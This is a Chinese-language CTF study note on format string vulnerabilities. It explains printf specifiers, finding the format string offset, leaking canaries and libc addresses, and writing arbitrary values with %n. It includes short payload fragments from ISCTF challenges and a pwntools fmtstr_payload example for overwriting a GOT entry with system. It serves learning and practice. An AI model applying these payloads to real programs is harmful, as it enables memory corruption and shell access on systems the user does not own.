## 格式化字符串

常用的字符串

%n—将n之前打印出来的字符个数赋值给一个变量

%x—输出不带0x的16进制数

%p—输出带0x的16进制数

%s—指向字符串首地址，输出整个字符串

```python
%x 输出不带0x的16进制数，只能打印4字节，一般只用于32位
%p 打印目标地址，建议32位和64位都用这个
%s 打印地址内容
%c 打印单个字符
%hhn 写一字节
%hn  写两字节
%n   将n之前打印出来的字符个数赋值给一个变量
%ln  32位写四字节，64位写八字节
%lln 写八字节
```

### 读取任意地址

如泄露Canary的地址

常用的确定格式化字符串是第几个参数的方式 `aaaaaaaa-%p-%p-%p-%p-%p-%p`然后找到后面`0x61616161`的那一串，数之间的偏移即可以找到格式化字符串的偏移

然后再去计算canary和缓冲区之间的字节数（8字节一个数据），最后加上之前算到的格式化字符串的偏移，就可以用来泄露canary的地址



拿ISCTF的fries为例，str的起始地址 : ("%8$p")，然后gdb可以看到一些可以利用的地址，比如可以用48处的puts泄露libc，可以泄露canary和rbp，泄露地址方式为
$$
\%[（泄露地址-输入点地址）/ 8  + str的偏移]$p
$$
![c2b18102092a1ec8cae73443753e73c6](C:\Users\Lenovo\Documents\Tencent Files\1253016986\nt_qq\nt_data\Pic\2023-12\Ori\c2b18102092a1ec8cae73443753e73c6.png)

其他在栈上的地址同理泄露，再利用libc等方式做题



### 写入任意地址  `addr%num$n`

**一般用来改写got中的函数地址，从而调用函数的时候拿到shell**

在ISCTF的fmt上用到了，其中要求v1等于18，v2=52

`%Yc%X$n`: 将Y写入栈上第X个位置指针指向的位置   

```python
#%8$p和%9$p处分别指向v1,v2
b'%18c%8$n'#填充18个字符，最后给v1赋值18
b'%34c%9$n'#继续填充34个字符，一共52个字符，赋值给v2为52
```





### 覆盖内存地址 

例如：要求改写c的值为16，已经给了c的地址，且找出了格式化字符串的偏移为6

```python
payload = p32(c_addr) + b'%12c' + b'%6$n'
```

把c的地址写入栈，32位占4字节，然后再填充12个字节，最后%6$n给c赋值16





### 一些工具

另外还看了下`FmtStr`类和`fmtstr_payload`函数

函数详情：这是专门为**32位**程序格式化字符串漏洞输出payload的一个函数

```python
fmtstr_payload(offset,writes,numbwritten=0,write_size=‘byte’)
```

- 第一个参数表示格式化字符串的偏移
- 第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将`printf`的GOT数据改为system函数地址，就写成`{printfGOT:systemAddress}`；
- 第三个参数表示已经输出的字符个数
- 第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着`hhn`、`hn`和`n`，默认值是byte，即按`hhn`写

类详情：

```python
FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)
```

- `execute_fmt`：与漏洞进程交互的函数
- `offset`：控制的第一个格式化程序的偏移
- `padlen`：在payload前添加的填充大小
- `numbwritten`：已经写入的字节数



还有一个是和`gdb`共存的工具`fmtarg`,可以直接算出指定地址的格式化字符串偏移![3f15853f8ce3f4e83b41e84e6a310779](C:\Users\Lenovo\Documents\Tencent Files\1253016986\nt_qq\nt_data\Pic\2023-12\Ori\3f15853f8ce3f4e83b41e84e6a310779.png)

